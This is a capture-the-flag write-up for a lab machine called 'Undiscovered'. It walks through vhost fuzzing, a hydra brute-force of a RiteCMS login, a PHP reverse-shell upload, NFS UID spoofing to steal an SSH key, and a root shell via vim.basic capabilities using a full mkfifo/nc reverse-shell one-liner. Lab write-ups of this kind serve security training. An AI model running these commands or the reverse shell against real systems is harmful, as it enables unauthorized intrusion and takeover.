Undiscovered

Target IP: 10.10.1.254
Challenge Description: Capture the flags!

Reconnaissance


Performing a port scan shows there are five TCP ports open on the target machine.


Doing an aggressive port scan against the open ports returns the result above. I will start enumeration with the HTTP application on port 80.


After adding undiscovered.thm to my /etc/hosts, I decided to scan for more VHOSTS using the command ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.undiscovered.thm" -u http://undiscovered.thm -fw 18 -fl 69 and found two entries after filtering by words and length: deliver and booking, as shown above.


Now my /etc/hosts contains the entry shown above. Now I am ready to perform enumeration.

Enumeration

Port 80: HTTP (booking.undiscovered.thm)

Browsing to http://booking.undiscovered.thm displays the webpage above.

Port 80: HTTP (deliver.undiscovered.thm)

Browsing to http://deliver.undiscovered.thm displays the webpage above. This webpage contains the application name and version RiteCMS 2.2.1.


I found the verified public exploit above for this application. Since this exploit requires authentication, I will need to perform more enumeration. This exploit mentions /cms/ is the login portal page.


I found the login portal at /cms/. I used default credentials, but I had no luck.


Doing a directory search against deliver.undiscovered.thm returns the entries above.


Browsing to /data/ directory shows the interesting database files shown above.


I downloaded the userdata database file on my machine. This file contains the username and password hash, admin:009dbadbcd5c49a89011b47c8cb27a81fcc0f2be54669bfcb8, as shown above. However, I tried to crack this password hash but I had no luck.


I downloaded the content database file on my machine. This database has a table called rite_notes which contains the interesting information shown above. Apparently, the NFS share for the user william needs to be completed. There exists a user on this machine called william.

Exploitation


I tried to bruteforce the login page with the username william, but I had no luck. Then I bruteforced the login page using the command hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong", and obtained the password liverpool of the user admin as shown above. Now I have the credentials admin:liverpool for the login page.


And using the credentials, I logged in successfully as the user admin as shown above. Time to exploit it.


To exploit the machine, I completed the following steps:

  1. Pressed the Administration button
  2. Pressed the File Manager option
  3. Changed the directory to files
  4. Created the file shell.php that contains the PHP Pentest Monkey reverse shell script
  5. Then pressed OK - Upload file button


After completing the previous steps, I started a listener on my machine at port 8443. Then I browsed to http://deliver.undiscovered.thm/files/shell.php. Now I have a foothold on the target machine with the session as www-data, as shown above.

Privilege Escalation


From previous enumeration I found the NFS share had to be created for the user william. Running cat /etc/exports shows the interesting information above.


On my machine, I created a new user called william. Then using the command sudo mount -t nfs 10.10.1.254:/home/william /home/william, I created the mount. I also used the command chmod 777 /home/william to change the permission so I can access the files as www-data. In the picture above, now I have access to the home directory files of the user william.


Running this binary shows the interesting information above. It tries to access the user input at /home/leonard directory. Maybe I can read the SSH key?


And bingo! Now I have the SSH key of user leonard as shown above. I copied this key to my machine.


Using the SSH key, I gained access to the SSH as the user leonard. I successfully elevated my privileges from the user www-data to leonard as shown above.


Running /sbin/getcap -r / 2>/dev/null shows /usr/bin/vim.basic binary has capabilities set. I tried to obtain a root shell by using GTFObins, but I had no luck.


The .viminfo is accessible. This file contains interesting commands left behind. I modified one of the command to create the reverse shell using vim.basic:
./vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.55.153 8444 >/tmp/f")'. I started a listener on port 8444, executed the command, and obtained a root reverse shell. Now I have a root level access on the target machine.
